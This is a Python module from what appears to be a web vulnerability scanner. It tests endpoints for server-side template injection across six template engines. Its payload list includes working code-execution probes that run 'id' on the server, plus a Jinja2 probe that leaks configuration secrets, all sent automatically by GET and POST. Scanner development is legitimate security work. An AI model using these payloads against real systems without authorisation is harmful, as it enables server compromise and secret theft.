"""SSTI Detector — tests for Server-Side Template Injection."""

from __future__ import annotations

from typing import Any

from sentinel_v2.executors.base import BaseExecutor


class SSTIDetector(BaseExecutor):
    """Tests for SSTI using template syntax payloads."""

    # Template syntax payloads with detection markers
    PAYLOADS = [
        # Jinja2 (Python)
        {"payload": "{{7*7}}", "marker": "49", "engine": "Jinja2"},
        {"payload": "{{config}}", "marker": "SECRET_KEY", "engine": "Jinja2"},
        {"payload": "{{self.__class__.__mro__[1].__subclasses__()}}", "marker": "<class", "engine": "Jinja2"},
        {"payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "marker": "uid=", "engine": "Jinja2"},

        # Twig (PHP)
        {"payload": "{{7*7}}", "marker": "49", "engine": "Twig"},
        {"payload": "_self.env.registerUndefinedFilterCallback('exec')_self.env.getFilter('id')", "marker": "uid=", "engine": "Twig"},

        # Freemarker (Java)
        {"payload": "${7*7}", "marker": "49", "engine": "Freemarker"},
        {"payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "marker": "uid=", "engine": "Freemarker"},

        # ERB (Ruby)
        {"payload": "<%= 7*7 %>", "marker": "49", "engine": "ERB"},
        {"payload": "<%= system('id') %>", "marker": "uid=", "engine": "ERB"},

        # Mako (Python)
        {"payload": "${7*7}", "marker": "49", "engine": "Mako"},
        {"payload": "<%import os%>${os.popen('id').read()}", "marker": "uid=", "engine": "Mako"},

        # Pug (Node.js)
        {"payload": "#{7*7}", "marker": "49", "engine": "Pug"},
        {"payload": "!=require('child_process').execSync('id')", "marker": "uid=", "engine": "Pug"},
    ]

    @property
    def name(self) -> str:
        return "ssti_detector"

    @property
    def vuln_class(self) -> str:
        return "ssti"

    @property
    def description(self) -> str:
        return "Tests for Server-Side Template Injection using template syntax payloads"

    async def test(self, endpoint: str, **kwargs) -> dict[str, Any]:
        findings = []
        evidence = []
        http = kwargs.get("http_client")
        headers = kwargs.get("headers", {})
        param_name = kwargs.get("param_name", "name")

        if not http:
            return {"findings": [], "evidence": [], "error": "No HTTP client"}

        for payload_data in self.PAYLOADS:
            payload = payload_data["payload"]
            marker = payload_data["marker"]
            engine = payload_data["engine"]

            # Test GET parameter
            test_url = f"{endpoint}?{param_name}={payload}"
            result = await http.request("GET", test_url, headers=headers)

            evidence.append({
                "payload": payload,
                "engine": engine,
                "status": result["status_code"],
                "length": len(result["body"]),
            })

            if marker in result["body"]:
                findings.append(self._create_finding(
                    title=f"SSTI — {engine} template injection detected",
                    severity="critical",
                    endpoint=endpoint,
                    evidence=f"Payload {payload} resulted in marker '{marker}' in response. Engine: {engine}",
                    steps=[
                        f"Set {param_name} to {payload}",
                        f"Observe {marker} in response",
                        f"Confirm {engine} template engine",
                        "Escalate to RCE via template payload",
                    ],
                    impact="Remote code execution via template injection",
                    confidence=0.9,
                ))
                break  # Found one engine, no need to test more

            # Test POST body
            post_result = await http.request("POST", endpoint, headers=headers,
                                              body=f"{param_name}={payload}")

            if marker in post_result["body"]:
                findings.append(self._create_finding(
                    title=f"SSTI — {engine} template injection via POST",
                    severity="critical",
                    endpoint=endpoint,
                    evidence=f"POST with {payload} resulted in marker '{marker}' in response",
                    steps=[
                        f"Send POST with {param_name}={payload}",
                        f"Observe {marker} in response",
                        "Escalate to RCE",
                    ],
                    impact="Remote code execution via template injection",
                    confidence=0.9,
                ))
                break

        return {
            "findings": [f.to_dict() for f in findings],
            "evidence": evidence,
            "tested_count": len(self.PAYLOADS),
            "vulnerable": len(findings) > 0,
        }
